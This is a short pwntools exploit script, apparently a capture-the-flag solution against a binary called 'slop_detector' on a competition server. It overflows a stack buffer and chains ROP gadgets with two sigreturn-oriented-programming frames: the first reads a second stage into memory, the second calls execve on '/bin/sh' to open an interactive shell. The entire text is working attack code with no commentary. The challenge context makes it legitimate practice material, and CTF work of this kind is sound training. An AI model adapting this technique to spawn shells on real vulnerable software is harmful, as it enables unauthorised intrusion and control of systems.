from pwn import *

context.arch = "amd64"
context.log_level = "debug"

elf = ELF("./slop_detector")

pop_rdi = 0x401311
syscall_plt = elf.plt["syscall"]
bss = elf.bss() + 0x800

p = remote("instancer.dalctf2026.com", 48902)

# step 1

frame1 = SigreturnFrame()

frame1.rip = syscall_plt

frame1.rdi = 0
frame1.rsi = 0
frame1.rdx = bss
frame1.rcx = 0x500
frame1.rsp = bss

payload = b"A" * 72

# syscall(39)
payload += p64(pop_rdi)
payload += p64(39)              
payload += p64(syscall_plt)
payload += p64(pop_rdi)
payload += p64(15)
payload += p64(syscall_plt)

payload += bytes(frame1)

p.recvuntil(b"sentence: ")
p.send(payload)


# step 2

binsh_addr = bss + 0x300
argv_addr = bss + 0x320

frame2 = SigreturnFrame()
frame2.rip = syscall_plt


frame2.rdi = 59
frame2.rsi = binsh_addr
frame2.rdx = argv_addr
frame2.rcx = 0
frame2.rsp = bss + 0x500

stage2 = b""

stage2 += p64(pop_rdi)
stage2 += p64(15)
stage2 += p64(syscall_plt)
stage2 += bytes(frame2)
stage2 = stage2.ljust(0x300, b"\x00")
stage2 += b"/bin/sh\x00"

stage2 = stage2.ljust(0x320, b"\x00")
stage2 += p64(binsh_addr)
stage2 += p64(0)

p.send(stage2)

p.interactive()